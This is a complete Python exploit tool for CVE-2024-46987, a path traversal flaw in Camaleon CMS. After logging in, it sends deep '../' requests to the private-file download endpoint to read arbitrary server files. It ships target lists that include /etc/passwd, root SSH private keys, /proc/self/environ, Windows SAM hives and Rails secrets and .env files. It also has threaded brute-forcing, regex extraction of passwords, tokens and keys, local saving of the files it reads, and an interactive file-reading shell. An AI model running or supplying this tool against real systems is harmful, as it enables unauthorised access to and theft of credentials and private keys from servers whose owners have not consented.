#!/usr/bin/env python3
"""
CVE-2024-46987 - Camaleon CMS Path Traversal / LFI Exploit
Improved version with advanced features and better reliability
"""
import requests
import argparse
import re
import sys
import os
import base64
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import json

disable_warnings()

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'

class CamaleonLFI:
    def __init__(self, url, user, password, endpoint, verbose=False, proxy=None, timeout=10):
        self.url = url.rstrip('/')
        self.user = user
        self.password = password
        self.endpoint = endpoint.lstrip('/')
        self.verbose = verbose
        self.timeout = timeout
        self.session = self._create_session(proxy)
        self.authenticated = False
        self.csrf_token = None
        self.traversal_base = "../../../../../../../../../.."
        self.common_files = self._load_common_files()
        
    def _create_session(self, proxy=None):
        """Create configured session with retry strategy"""
        session = requests.Session()
        session.verify = False
        session.timeout = self.timeout
        
        # Set default headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        # Configure proxy if specified
        if proxy:
            session.proxies = {
                'http': proxy,
                'https': proxy
            }
            self.log(f"Using proxy: {proxy}", "INFO")
            
        return session
    
    def _load_common_files(self):
        """Load common files to try during enumeration"""
        return {
            'linux': [
                '/etc/passwd',
                '/etc/hosts',
                '/etc/hostname',
                '/etc/os-release',
                '/etc/issue',
                '/proc/self/environ',
                '/proc/version',
                '/proc/mounts',
                '/proc/cmdline',
                '/var/log/auth.log',
                '/var/log/syslog',
                '/var/log/apache2/access.log',
                '/var/log/nginx/access.log',
                '/var/www/html/.env',
                '/var/www/html/config/database.yml',
                '/root/.bash_history',
                '/root/.ssh/id_rsa',
                '/root/.ssh/authorized_keys',
            ],
            'windows': [
                '/windows/win.ini',
                '/windows/system32/drivers/etc/hosts',
                '/boot.ini',
                '/autoexec.bat',
                '/windows/debug/NetSetup.log',
                '/windows/system32/config/sam',
                '/windows/system32/config/system',
                '/windows/system32/license.rtf',
            ],
            'rails': [
                '/config/database.yml',
                '/config/secrets.yml',
                '/config/application.yml',
                '/config/initializers/secret_token.rb',
                '/config/initializers/devise.rb',
                '/db/seeds.rb',
                '/Gemfile',
                '/Gemfile.lock',
                '/.env',
                '/.git/config',
                '/.git/HEAD',
                '/app/models/user.rb',
                '/public/robots.txt',
                '/public/.htaccess',
            ]
        }
    
    def log(self, message, level="INFO"):
        """Enhanced logging with colors"""
        if not self.verbose and level not in ["ERROR", "SUCCESS"]:
            return
            
        levels = {
            "INFO": (Colors.BLUE, "*"),
            "SUCCESS": (Colors.GREEN, "+"),
            "ERROR": (Colors.RED, "-"),
            "WARNING": (Colors.YELLOW, "!"),
            "DEBUG": (Colors.MAGENTA, "?"),
            "RESULT": (Colors.CYAN, "→")
        }
        color, symbol = levels.get(level, (Colors.ENDC, "*"))
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{Colors.BOLD}{timestamp}{Colors.ENDC}] [{color}{symbol}{Colors.ENDC}] {message}", file=sys.stderr)

    def get_csrf_token(self, url, patterns=None):
        """Extract CSRF token with multiple pattern matching"""
        if patterns is None:
            patterns = [
                r'name="authenticity_token" value="([^"]+)"',
                r'authenticity_token"[^>]*value="([^"]+)"',
                r'csrf-token" content="([^"]+)"',
                r'name="csrf-token" content="([^"]+)"',
                r'csrf-param" content="([^"]+)"'
            ]
        
        try:
            r = self.session.get(url)
            
            for pattern in patterns:
                match = re.search(pattern, r.text)
                if match:
                    token = match.group(1)
                    self.log(f"CSRF token found: {token[:20]}...", "DEBUG")
                    return token
                    
            self.log(f"No CSRF token found in {url}", "WARNING")
            return None
            
        except requests.RequestException as e:
            self.log(f"Error fetching CSRF token: {e}", "ERROR")
            return None

    def login(self):
        """Enhanced login with better error handling and session management"""
        login_url = f"{self.url}/admin/login"
        self.log(f"Authenticating to {login_url}", "INFO")
        
        # Get CSRF token
        self.csrf_token = self.get_csrf_token(login_url)
        if not self.csrf_token:
            self.log("Failed to obtain CSRF token", "ERROR")
            return False

        # Prepare login data
        login_data = {
            'authenticity_token': self.csrf_token,
            'user[username]': self.user,
            'user[password]': self.password,
            'commit': 'Login'
        }
        
        try:
            # Attempt login
            r = self.session.post(
                login_url, 
                data=login_data, 
                allow_redirects=True,
                headers={'Referer': login_url}
            )
            
            # Check login success (multiple indicators)
            success_indicators = ['logout', 'dashboard', 'profile', 'admin/dashboard']
            response_text = r.text.lower()
            
            if any(indicator in response_text for indicator in success_indicators):
                self.log(f"Authentication successful as {self.user}", "SUCCESS")
                self.authenticated = True
                
                # Update CSRF token from session after login
                new_token = self.get_csrf_token(f"{self.url}/admin/dashboard")
                if new_token:
                    self.csrf_token = new_token
                    
                return True
            else:
                self.log("Authentication failed - invalid credentials", "ERROR")
                if self.verbose:
                    self.log(f"Response preview: {r.text[:200]}", "DEBUG")
                return False
                
        except requests.RequestException as e:
            self.log(f"Connection error during login: {e}", "ERROR")
            return False

    def build_lfi_url(self, target_file, depth=12):
        """Build LFI URL with proper traversal"""
        traversal = "/".join([".."] * depth)
        
        # Handle absolute paths correctly
        if target_file.startswith('/'):
            target_file = target_file[1:]
            
        # Construct the full path with traversal
        lfi_path = f"{traversal}/{target_file}"
        
        # URL encode if needed
        # lfi_path = requests.utils.quote(lfi_path)
        
        return f"{self.url}/{self.endpoint}", {'file': lfi_path}

    def read_file(self, target_file, depth=12, raw_output=True):
        """Read file via LFI with depth control"""
        if not self.authenticated:
            self.log("Not authenticated. Attempting login...", "WARNING")
            if not self.login():
                self.log("Authentication required", "ERROR")
                return None

        # Build LFI request
        lfi_url, params = self.build_lfi_url(target_file, depth)
        self.log(f"Requesting: {lfi_url} with file={params['file']}", "DEBUG")

        try:
            r = self.session.get(lfi_url, params=params)
            
            if r.status_code == 200:
                # Check if response is not empty and not an error page
                if len(r.text) > 100 or "No such file" not in r.text:
                    content_length = len(r.text)
                    self.log(f"Successfully read {target_file} ({content_length} bytes)", "SUCCESS")
                    
                    if raw_output:
                        # Print raw content for piping/output
                        print(r.text, end='')
                    else:
                        # Display with headers
                        print(f"\n{Colors.BOLD}{'='*60}{Colors.ENDC}")
                        print(f"{Colors.CYAN}File: {target_file}{Colors.ENDC}")
                        print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}")
                        print(r.text)
                        print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}\n")
                    
                    return r.text
                else:
                    self.log(f"File {target_file} not found or empty", "WARNING")
                    return None
            else:
                self.log(f"HTTP {r.status_code} when reading {target_file}", "ERROR")
                return None
                
        except requests.RequestException as e:
            self.log(f"Request error: {e}", "ERROR")
            return None
        except Exception as e:
            self.log(f"Unexpected error: {e}", "ERROR")
            return None

    def check_vulnerability(self):
        """Verify if target is vulnerable to LFI"""
        self.log("Checking vulnerability...", "INFO")
        
        # Test with a known file
        test_files = [
            '/etc/passwd',
            '/Gemfile',
            '/config/database.yml'
        ]
        
        for test_file in test_files:
            content = self.read_file(test_file, raw_output=False)
            if content and len(content) > 0:
                self.log(f"Target is VULNERABLE (confirmed with {test_file})", "SUCCESS")
                return True
                
        self.log("Target may not be vulnerable", "ERROR")
        return False

    def brute_force_files(self, file_list=None, depth=12, max_workers=5):
        """Brute force multiple files"""
        if file_list is None:
            # Combine all common files
            file_list = []
            for category in self.common_files.values():
                file_list.extend(category)
            file_list = list(set(file_list))  # Remove duplicates
        
        self.log(f"Brute forcing {len(file_list)} files...", "INFO")
        
        results = {}
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_file = {
                executor.submit(self.read_file, f, depth, False): f 
                for f in file_list
            }
            
            for future in as_completed(future_to_file):
                target_file = future_to_file[future]
                try:
                    content = future.result(timeout=15)
                    if content:
                        results[target_file] = content[:200] + "..." if len(content) > 200 else content
                        self.log(f"Found: {target_file}", "SUCCESS")
                except Exception as e:
                    self.log(f"Error with {target_file}: {e}", "ERROR")
        
        return results

    def download_file(self, target_file, output_dir="lfi_downloads"):
        """Download file and save locally"""
        content = self.read_file(target_file, raw_output=True)
        
        if content:
            # Create output directory
            os.makedirs(output_dir, exist_ok=True)
            
            # Sanitize filename
            safe_filename = target_file.replace('/', '_').replace('\\', '_')
            output_path = os.path.join(output_dir, safe_filename)
            
            # Save file
            with open(output_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
                
            self.log(f"File saved to {output_path}", "SUCCESS")
            return output_path
            
        return None

    def extract_credentials(self):
        """Attempt to extract credentials from common files"""
        self.log("Attempting credential extraction...", "INFO")
        
        cred_files = [
            '/config/database.yml',
            '/config/secrets.yml',
            '/.env',
            '/app/models/user.rb',
            '/db/seeds.rb'
        ]
        
        credentials = {}
        for cred_file in cred_files:
            content = self.read_file(cred_file, raw_output=False)
            if content:
                # Look for common credential patterns
                patterns = {
                    'password': r'password[:\s]+["\']?([^"\'\s]+)',
                    'username': r'username[:\s]+["\']?([^"\'\s]+)',
                    'secret': r'secret[:\s]+["\']?([^"\'\s]+)',
                    'key': r'key[:\s]+["\']?([^"\'\s]+)',
                    'token': r'token[:\s]+["\']?([^"\'\s]+)'
                }
                
                file_creds = {}
                for cred_type, pattern in patterns.items():
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        file_creds[cred_type] = matches
                        
                if file_creds:
                    credentials[cred_file] = file_creds
                    
        return credentials

    def interactive_shell(self):
        """Simple interactive shell for LFI"""
        if not self.authenticated and not self.login():
            self.log("Authentication required", "ERROR")
            return
            
        print(f"\n{Colors.BOLD}Camaleon LFI Interactive Shell{Colors.ENDC}")
        print(f"{Colors.YELLOW}Commands: read <file>, download <file>, brute, creds, help, exit{Colors.ENDC}\n")
        
        while True:
            try:
                cmd = input(f"{Colors.CYAN}lfi>{Colors.ENDC} ").strip().split()
                
                if not cmd:
                    continue
                    
                if cmd[0] == "exit":
                    break
                    
                elif cmd[0] == "help":
                    print("Commands:")
                    print("  read <file>          - Read a file")
                    print("  download <file>      - Download a file")
                    print("  brute                - Brute force common files")
                    print("  creds                - Extract credentials")
                    print("  help                 - Show this help")
                    print("  exit                 - Exit shell")
                    
                elif cmd[0] == "read" and len(cmd) > 1:
                    self.read_file(cmd[1], raw_output=False)
                    
                elif cmd[0] == "download" and len(cmd) > 1:
                    self.download_file(cmd[1])
                    
                elif cmd[0] == "brute":
                    results = self.brute_force_files()
                    print(f"\nFound {len(results)} files:")
                    for f in results:
                        print(f"  - {f}")
                        
                elif cmd[0] == "creds":
                    creds = self.extract_credentials()
                    if creds:
                        print(json.dumps(creds, indent=2))
                    else:
                        print("No credentials found")
                        
                else:
                    print("Unknown command. Type 'help' for usage.")
                    
            except KeyboardInterrupt:
                print("\nExiting...")
                break
            except Exception as e:
                self.log(f"Error: {e}", "ERROR")

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-46987 - Camaleon CMS Path Traversal / LFI Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic file read
  %(prog)s -u http://target.com -l admin -p password /etc/passwd
  
  # Verbose mode with custom endpoint
  %(prog)s -u http://target.com -l admin -p password --path custom/endpoint -v /etc/passwd
  
  # Brute force common files
  %(prog)s -u http://target.com -l admin -p password --brute
  
  # Download files
  %(prog)s -u http://target.com -l admin -p password --download /etc/passwd -o output/
  
  # Interactive shell
  %(prog)s -u http://target.com -l admin -p password --interactive
  
  # With proxy for debugging
  %(prog)s -u http://target.com -l admin -p password --proxy http://127.0.0.1:8080 /etc/passwd
        """
    )
    
    # Target arguments
    parser.add_argument("-u", "--url", required=True, help="Target Camaleon CMS URL")
    parser.add_argument("-l", "--user", required=True, help="Username for authentication")
    parser.add_argument("-p", "--password", required=True, help="Password for authentication")
    
    # LFI arguments
    parser.add_argument("--path", default="admin/media/download_private_file", 
                       help="LFI endpoint (default: admin/media/download_private_file)")
    parser.add_argument("--depth", type=int, default=12, 
                       help="Traversal depth (default: 12)")
    
    # Operation modes
    parser.add_argument("file", nargs="?", help="File to read (optional)")
    parser.add_argument("--brute", action="store_true", 
                       help="Brute force common files")
    parser.add_argument("--download", action="store_true", 
                       help="Download file(s) instead of displaying")
    parser.add_argument("--interactive", action="store_true", 
                       help="Start interactive shell")
    parser.add_argument("--check", action="store_true", 
                       help="Check vulnerability only")
    parser.add_argument("--extract-creds", action="store_true", 
                       help="Extract credentials from common files")
    
    # Output options
    parser.add_argument("-o", "--output", default="lfi_output", 
                       help="Output directory for downloads (default: lfi_output)")
    parser.add_argument("--format", choices=['raw', 'pretty'], default='raw',
                       help="Output format (default: raw)")
    
    # Advanced options
    parser.add_argument("-v", "--verbose", action="store_true", 
                       help="Verbose output")
    parser.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=10, 
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("--threads", type=int, default=5, 
                       help="Threads for brute forcing (default: 5)")
    
    args = parser.parse_args()
    
    # Initialize exploit
    lfi = CamaleonLFI(
        url=args.url,
        user=args.user,
        password=args.password,
        endpoint=args.path,
        verbose=args.verbose,
        proxy=args.proxy,
        timeout=args.timeout
    )
    
    # Login first
    print(f"\n{Colors.BOLD}{'='*60}{Colors.ENDC}")
    print(f"{Colors.BOLD}CVE-2024-46987 - Camaleon CMS LFI Exploit{Colors.ENDC}")
    print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}\n")
    
    if not lfi.login():
        print(f"{Colors.RED}[-] Authentication failed{Colors.ENDC}")
        sys.exit(1)
    
    # Check vulnerability only
    if args.check:
        if lfi.check_vulnerability():
            print(f"{Colors.GREEN}[+] Target is vulnerable{Colors.ENDC}")
        else:
            print(f"{Colors.RED}[-] Target may not be vulnerable{Colors.ENDC}")
        sys.exit(0)
    
    # Interactive shell
    if args.interactive:
        lfi.interactive_shell()
        sys.exit(0)
    
    # Extract credentials
    if args.extract_creds:
        creds = lfi.extract_credentials()
        if creds:
            print(json.dumps(creds, indent=2))
        else:
            print(f"{Colors.YELLOW}[!] No credentials found{Colors.ENDC}")
        sys.exit(0)
    
    # Brute force mode
    if args.brute:
        results = lfi.brute_force_files(max_workers=args.threads)
        print(f"\n{Colors.GREEN}[+] Found {len(results)} readable files:{Colors.ENDC}")
        for f in results:
            print(f"  {Colors.CYAN}→{Colors.ENDC} {f}")
        sys.exit(0)
    
    # Single file mode
    if args.file:
        raw_output = (args.format == 'raw' and not args.download)
        
        if args.download:
            output_path = lfi.download_file(args.file, args.output)
            if output_path:
                print(f"{Colors.GREEN}[+] File downloaded to {output_path}{Colors.ENDC}")
        else:
            lfi.read_file(args.file, args.depth, raw_output)
    else:
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unexpected error: {e}{Colors.ENDC}")
        if 'lfi' in locals() and lfi.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
